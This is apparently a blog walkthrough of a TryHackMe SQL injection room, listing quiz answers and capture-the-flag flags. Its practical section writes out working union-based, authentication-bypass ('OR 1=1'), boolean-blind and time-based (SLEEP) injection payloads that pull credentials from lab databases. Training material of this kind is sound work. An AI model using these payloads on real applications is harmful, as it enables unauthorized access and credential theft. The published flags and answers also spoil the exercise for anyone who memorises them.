# TryHackme walkthrough with answers- SQL Injection Introduction

Hi! Writing another walkthrough for this week.

## Task 1 Introduction

This room assumes you have completed the **Database SQL Basics room** and are comfortable with `SELECT`, `FROM`, `WHERE`, and `ORDER BY`. If those concepts are unfamiliar, complete that room first.

Well upon reading that, (hopefully you have completed the room mentioned above), and let’s start learning about SQL Injection!

## Task 2 SQL Essentials for Injection

Some basic stuff: SQL Comments, UNION, LIKE and Wildcards, LIMIT, String Functions and the information_schema database. If you did the Database SQL Basics room, all of this will sound familiar.

_What SQL statement combines results from two SELECT queries into one result set?_

**UNION**

---

_What built-in database contains metadata about all other databases, tables, and columns in MySQL?_

**information_schema**

## Task 3 What is SQL Injection

* SQL Injection occurs when a **web application** incorporates **user-supplied input directly into a SQL query** without **proper sanitisation or parameterisation.**
* **How web applications use sql**: when you browse a website, many of the pages you see are generated **dynamically from a database**.

* **The vulnerability**: when the application builds the query by **directly concatenating user input** into the SQL string.

* There are three types of SQL Injection: **In-Band SQL Injection, Blind SQL Injection and Out-of-Band SQL Injection**.
* You make sure an application is injectable by **injecting test characters** and **observing the response**.

  
_What character is commonly used as a first test when probing for SQL Injection?_

**‘**

---

_What type of SQL Injection returns results directly in the web page?_

**In-Band**

## Task 4 In-Band SQL Injection

After reading about in-band SQL injection (error-based and union-based):

_What subtype of In-Band SQLi relies on database error messages to extract information?_

**Error-Based**

---

_What SQL function returns the name of the current database in MySQL?_

**database()**

## Task 5 Blind SQL Injection: Authentication Bypass

_“Blind SQL Injection occurs when the application does not show query results or error messages to the user. The injection still works: the database still processes your malicious input, but you have no direct way to see the output. Instead, you must infer whether your injection succeeded from the application’s behaviour: did you get logged in? Did the page content change? Did the response take longer?
Authentication bypass is the most intuitive example of Blind SQLi. You never see the database output, because you only see whether you’re logged in or not.”_

Ok after we read the stuff:

_What boolean condition is commonly injected to make a WHERE clause always evaluate to true?_

**1=1**

## Task 6 Blind SQL Injection

* App shows different content for true vs false: Boolean-Based
* App response looks identical, no matter what: Time-Based

_What MySQL function causes a deliberate time delay in a query’s response?_

**SLEEP**

## Task 7 Out-of-Band SQL Injection

_“You will not use OOB as often as In-Band or Blind, but when you hit a target where every other avenue is shut down, and the database has network access, it can be the only way to get data out.”, we read about the two channels involved, and we learn about DNS exfiltration with MySQL, MSSQL techniques, how to receive the data and its limitations."_ Good:


_What protocol beginning with D is commonly used to exfiltrate data in Out-of-Band SQLi?_

**DNS**

---

_What MSSQL stored procedure can be used to trigger DNS lookups for data exfiltration?_

**xp_dirtree**

## Task 8 Remediation and Prevention

* Prepared Statements (Parameterised Queries)
* Input Validation
* Escaping User Input
* Principle of Least Privilege
* Web Application Firewalls (WAFs)

_What is the primary and most effective defence against SQL Injection?_

**Prepared Statements**

## Task 9 Practical: SQL Injection

_What is the flag after completing Level 1?_

We see something like this:
<img width="1400" height="794" alt="image" src="https://github.com/user-attachments/assets/3f39b34c-253d-4fe5-9c0e-92d0893b9819" />

According to the instructions, we change the number after id= to

```
1 UNION SELECT 1
```

We got an error, so

```
1 UNION SELECT 1,2
```

still error:

```
1 UNION SELECT 1,2,3
```

Finally, an output (the article loads).

Now we change the command to

```
0 UNION SELECT 1,2,3
```

A valid id like 1 overrides our UNION output, showing the valid article. 0 leaves only the UNION output:

<img width="1359" height="685" alt="image" src="https://github.com/user-attachments/assets/4d3460a6-c9ce-4cde-bc05-8555b6dbd00c" />

Because the 3 shows up in the content area, we will use this column for extraction.

To get the database name, we use

```
0 UNION SELECT 1,2,database()
```

after id= in the url.

<img width="1400" height="769" alt="image" src="https://github.com/user-attachments/assets/d37bde1e-241d-4d54-882e-a0571a8fe89b" />

The database name is **sqli_one**.

Then use

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

* **information_schema** holds the names of every table in every database on the server
* **group_concat()** concatenates all results into a single string so they fit in the single column we have available

The output I got:

<img width="1400" height="826" alt="image" src="https://github.com/user-attachments/assets/e71bdde2-58aa-4514-b0eb-7667fd9023fa" />

Now seeing two tables, **staff_users** is our target one. We list the columns:

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

and

<img width="1400" height="652" alt="image" src="https://github.com/user-attachments/assets/f025189d-cbe4-4059-8f27-2681950e6d6d" />

Lastly we extract the credentials:

```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
<img width="1400" height="670" alt="image" src="https://github.com/user-attachments/assets/94ae7ac0-3136-46d4-9749-e294f051867f" />

Entering Martin’s password (pa$$word) and pressing “check password” forwards us to the next level and shows the flag:

**THM{SQL_INJECTION_3840}**

---

_What is the flag after completing Level 2?_

<img width="1400" height="836" alt="image" src="https://github.com/user-attachments/assets/08b7a773-7310-4900-b2d2-4bd2146fa96f" />

We see the website and the SQL Query box.

_“The app checks whether this query returns a row. If it does, you are in. It never shows you the data; it just shows success or failure. That makes this Blind SQLi: the injection works, but the results aren’t visible on the page.”_

Put

```
' OR 1=1;--
```

in the username field, and anything in the password field.

* username='' doesn’t match a user
* OR 1=1 is true, making theWHERE clause true
* ;-- ends the statement and comments out everything after it, including the and password= check
* The database returns every row. The app sees rows and logs you in as the first user

The password field is irrelevant because -- removes it from the query before the database ever evaluates it.

**THM{SQL_INJECTION_9581}**

---
_What is the flag after completing Level 3?_

<img width="1400" height="766" alt="image" src="https://github.com/user-attachments/assets/a3790e77-939e-4194-a215-0f1dbba87b3d" />

Level three is a boolean-based blind SQLi. If we execute the url in the top browser, we see {“taken”:true}. There is no data in the page output. We sill ask the data-base yes/no questions and “extract content one character at a time”.

```
admin123' UNION SELECT 1,2,3 where database() like '%';--
```

* % matches everything
* the {“taken”:true} output confirms that it is injectable


To get the database name, we try letter by letter:

```
admin123' UNION SELECT 1,2,3 where database() like 'a%';--
```

We get a false output:

```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

Now a true output: the first letter of the database is s.

Trying the next letter:

```
admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
```

True output. We go on and on, until we get the database name:

**sqli_three**

(To make sure the full database name is actually the full one, for the last injection we remove the %, and the condition is still true- it is the complete name.)

Then, we find the table names:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
```

Again, go on and on (u%, us%, us%, use%, user%, users%, users). The table name is users.

Then to find the column names:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';-
```

We find the columns username and password.

Then we extract the username using the same way:

```
admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
```

etc. The username is admin.

Then the password:

```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--
```

The final credentials, **admin** and **3845** .

Entering the credentials and pressing login reveals the third flag and directs us the next level.

The flag is:

**THM{SQL_INJECTION_1093}**

---

_What is the flag after completing Level 4?_

Basically we determine whether a condition is true or false based on the response time.

We find the column count:

```
admin123' UNION SELECT SLEEP(5);--
```

<img width="1400" height="806" alt="image" src="https://github.com/user-attachments/assets/c7e8d0ac-6b4d-4b83-ba51-2d17b2c46268" />


The result comes back immediately, so wrong column count.

```
admin123' UNION SELECT SLEEP(5),2;--
```

<img width="1400" height="731" alt="image" src="https://github.com/user-attachments/assets/1b0d15f4-d824-40dd-b0cf-5231ccaf7a71" />

It took 5 seconds to respond this time. The SLEEP function only works when the condition is true, so the table has 2 columns.

Then for the database name:

```
admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
```

Same as before, but we focus on the response delay rather than a true or false output.

We find out that the database name is **sqli_four**.

To enumerate tables and columns:

Tables-

```
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--
```

After finding the users table, we find the columns:

```
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';-
```

The columns username and password, again.

```
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
```

We eventually find out the password is **4961**. (refer to level three and modify)

“Enter admin and 4961 in the login form and click Login to get the final flag.”

Then we see the flag:

**THM{SQL_INJECTION_MASTER}**

## Task 10 Conclusion

And we are done. To be honest, when I started writing this walkthrough, I expected the room to be relatively hard (I mean by more self-directed). Unexpectedly, it already had a immensely detailed walkthrough, so I just ended up sort of summarising the room, and providing the answers? Nevertheless, I hope this walkthrough helped! If so, please leave a like or comment. That’s all for this week.













